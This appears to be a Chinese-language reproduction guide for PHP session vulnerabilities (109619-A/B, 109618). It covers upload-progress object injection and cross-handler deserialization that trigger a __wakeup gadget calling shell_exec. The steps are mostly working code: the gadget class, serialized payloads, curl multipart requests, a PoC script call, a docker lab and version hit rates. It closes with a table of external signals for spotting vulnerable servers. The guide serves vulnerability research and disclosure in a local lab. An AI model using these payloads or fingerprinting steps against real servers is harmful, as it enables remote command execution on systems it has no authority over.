# 复现步骤

下面的命令假设你已经有一台靶机（Debian 12/13，装有 Apache 2.4）。路径都是占位，按环境改。

## 一、109619-A：启动期 `__wakeup` → 命令执行

### 1. 准备一个带魔术方法的类，并让 preload 加载它

```php
<?php
// /var/www/lab/preload.php
class DemoGadget {
    public $a;
    public function __wakeup() {
        @file_put_contents('/var/www/lab/proof.txt',
            "pid=" . getmypid() . "\n" . @shell_exec('id; hostname') . "\n", FILE_APPEND);
    }
}
```

php.ini（全局，不要只写在 vhost 里）：

```ini
opcache.enable=1
opcache.preload=/var/www/lab/preload.php
opcache.preload_user=www-data
```

### 2. 准备一个包含该对象的会话文件

```
data|O:12:"DemoGadget":1:{s:1:"a";s:1:"b";}
```

放到 `session.save_path` 下，文件名 `sess_<你的会话ID>`。会话 ID 用 32 位字母数字，太短会被 upload-progress 拒绝。

### 3. 发一次 multipart 请求

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -b 'PHPSESSID=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' \
  -H 'Content-Type: multipart/form-data; boundary=----probe' \
  --data-binary @payload.bin \
  http://127.0.0.1/any.php
```

`payload.bin` 里只需要两个字段：

```
------probe
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

x
------probe
Content-Disposition: form-data; name="f"; filename="a.txt"
Content-Type: text/plain

AB
------probe--
```

目标页面不需要调用 `session_start()`，甚至可以是只有一句 `echo` 的空页面。

### 4. 看证据

```bash
cat /var/www/lab/proof.txt
```

## 二、109619-B：跨 handler 对象注入

前提：目标有两个目录，一个写会话时用 `php_serialize`，另一个读会话时用默认 `php`，并且两者共用同一个 `session.save_path`。

### 1. 写入侧（`php_serialize`）

目录下放 `.user.ini`：

```ini
session.serialize_handler=php_serialize
```

写脚本里调用 `session_start()`，然后发一个 multipart，把进度字段的名字设成：

```
x|O:12:"DemoGadget":1:{s:1:"a";s:1:"b";}
```

落盘后会话文件内容大致是：

```
a:1:{s:51:"upload_progress_x|O:12:"DemoGadget":1:{s:1:"a";s:1:"b";}";a:5:{...}}
```

### 2. 读取侧（默认 `php`）

换一个默认 handler 的目录，发同样的请求（进度字段随便填）。解码器在第一个 `|` 处切开，后半段正好是序列化对象，对象被创建，`__wakeup` 执行。

### 3. 脚本

```bash
python3 poc/poc_109619_inject.py \
  --poison-url  http://127.0.0.1/ps/up.php \
  --trigger-url http://127.0.0.1/plain.php \
  --object 'O:12:"DemoGadget":1:{s:1:"a";s:1:"b";}' \
  --proof-url   http://127.0.0.1/proof.txt \
  --authorized
```

## 三、109618：官方镜像对照

```bash
docker run -d --name lab -p 127.0.0.1:8080:80 \
  -v $PWD/lab/php.ini:/usr/local/etc/php/conf.d/zz.ini:ro \
  -v $PWD/lab/www:/var/www/html:ro \
  php:8.5.11-apache
```

`lab/php.ini` 至少需要 `memory_limit=8M`、`post_max_size=64M`、`display_errors=On`。
然后使用公开实现（见 README 顶部的链接）指向 `http://127.0.0.1:8080/index.php`。

我们实测：8.5.11 四次四中，8.4.26、8.3.35 各一次一中，8.5.12 全部失败。
自编译构建（debug / 非 debug / 官方 configure 参数）全部失败。

## 四、判定的三个信号

| 信号 | 怎么看 | 含义 |
|---|---|---|
| 版本 | `X-Powered-By` | 只说明"受不受影响" |
| upload-progress 可达 | 一次无害 multipart 返回 200 | 说明端点会走这条路径 |
| 启动期 OOM | 响应或日志里出现 `Allowed memory size ... in Unknown on line 0` | **109618 路径可达的最强外部信号** |

第三条比版本号有用得多：同版本不同构建，行为会不一样。
